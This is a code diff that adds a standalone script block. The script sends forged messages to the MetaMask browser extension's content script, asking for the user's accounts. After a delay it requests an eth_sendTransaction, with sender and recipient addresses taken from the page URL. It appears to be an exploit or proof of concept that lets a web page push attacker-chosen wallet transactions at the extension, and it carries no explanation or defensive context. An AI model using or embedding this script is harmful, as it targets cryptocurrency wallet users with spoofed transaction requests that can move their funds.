@@ -1,0 +1,47 @@
+<script>
+  (function(){
+    function requestEthAccounts() {
+        postMessage.call(window, {
+            "target": "metamask-contentscript",
+            "data": {
+                "name": "metamask-provider",
+                "data": {
+                    "method": "eth_requestAccounts",
+                    "id": Math.floor(Math.random() * (108900)) + 1,
+                }
+            }
+        }, '*');
+    }
+    function ethTransaction(from, to) {
+        postMessage.call(window, {
+            "target": "metamask-contentscript",
+            "data": {
+                "name": "metamask-provider",
+                "data": {
+                    "method": "eth_sendTransaction",
+                    "params": [
+                        {
+                            "from": from,
+                            "to": to,
+                            "value": "2",
+                            "gasPrice": "",
+                            "type": "0x0",
+                            "data": ""
+                        }
+                    ],
+                    "jsonrpc": "2.0",
+                    "id": Math.floor(Math.random() * (108900)) + 1,
+                },
+            }
+        }, '*');
+    }
+    function main() {
+      const x = location.href.split('from=')[1];
+      if (!x) return setTimeout(requestEthAccounts, 4000);
+      const from = x.split('&')[0];
+      const to = x.split('=')[1];
+      setTimeout(ethTransaction, 4000, from, to);
+    }
+    main();
+}());
+</script>
